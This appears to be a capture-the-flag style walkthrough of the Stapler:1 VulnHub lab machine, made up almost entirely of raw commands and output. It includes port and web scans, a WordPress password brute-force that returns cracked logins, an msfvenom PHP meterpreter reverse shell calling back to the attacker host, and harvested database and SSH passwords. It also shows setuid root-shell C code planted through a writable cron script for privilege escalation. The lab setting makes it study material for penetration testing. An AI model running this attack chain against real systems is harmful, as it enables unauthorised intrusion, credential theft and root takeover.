https://kooksec.blogspot.com/2016/08/stapler-1-vulnhub-walkthough.html


└─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.43
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-11 07:04 CEST
Nmap scan report for 192.168.110.43
Host is up (0.00074s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.110.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   tcpwrapped
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, SupportsCompression, LongColumnFlag, Speaks41ProtocolNew, Speaks41ProtocolOld, LongPassword, SupportsTransactions, ODBCClient, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, FoundRows, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: ng\x16= T\x01>\x0B4>7`\x071\x184V:E
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:72:AC:AD (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m58s, deviation: 34m37s, median: 1h59m57s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2021-09-11T08:05:45+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-11T07:05:45
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.74 ms 192.168.110.43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.15 seconds




```console
─$ nikto -h 192.168.110.43:12380
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.43
+ Target Hostname:    192.168.110.43
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2021-09-11 07:16:39 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Hostname '192.168.110.43' does not match certificate's names: Red.Initech
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 8071 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2021-09-11 07:18:36 (GMT2) (117 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
```console
$ wpscan --url https://192.168.110.43:12380/blogblog/ -e --disable-tls-checks --no-banner --no-update  --passwords /usr/share/wordlists/rockyou.txt


[+] Performing password attack on Xmlrpc Multicall against 11 user/s
[SUCCESS] - garry / football
[SUCCESS] - harry / monkey
[SUCCESS] - scott / cookie
[SUCCESS] - kathy / coolgirl
[SUCCESS] - barry / washere
[SUCCESS] - john / incorrect
^Cogress Time: 00:34:08 <                            > (2674 / 144037)  1.85%  ETA: 30:04:50
```
```console

└─$ msfvenom -p php/meterpreter/reverse_tcp --list-options
└─$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f raw -o rev.php

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.110.1
msf6 exploit(multi/handler) > run

└─$ curl https://192.168.110.43:12380/blogblog/wp-content/uploads/rev.php -k
```

```bash
netstat -tlpn 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:666             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::139                  :::*                    LISTEN      -               
tcp6       0      0 :::53                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::12380                :::*                    LISTEN      -               
tcp6       0      0 :::12380                :::*                    LISTEN      -               
tcp6       0      0 :::12380                :::*                    LISTEN      -               
tcp6       0      0 :::445                  :::*                    LISTEN      -     
```

```php

define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');


mysql -uroot -pplbkac -h 192.168.110.43


find  /home -name ".bash_history" 2>/dev/null -exec cat {} \;
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost

```
```bash

peter@red ~ % uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux

└─$ searchsploit Ubuntu 16.04 
```

```c
/*
root@red:~/39772/ebpf_mapfd_doubleput_exploit# cat suidhelper.c
gcc -o suidhelper suidhelper.c -Wall
*/
#include <unistd.h>
#include <err.h>
#include <stdio.h>
#include <sys/types.h>

int main(void) {
        if (setuid(0) || setgid(0))
                err(1, "setuid/setgid");
        fputs("we have root privs now...\n", stderr);
        execl("/bin/bash", "bash", NULL);
        err(1, "execl");
}

```

JKanode@red:/tmp$ echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c


```c
/*setuid.c*/
/*gcc setuid.c -o setuid*/
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(void){
        setuid(0);
        setgid(0);
        system("/bin/bash");
}

```

```bash
peter@red ~ % cat /usr/local/sbin/cron-logrotate.sh
#Simon, you really need to-do something about this

chown root.root /home/peter/suidhelper
chmod 4755 /home/peter/suidhelper


```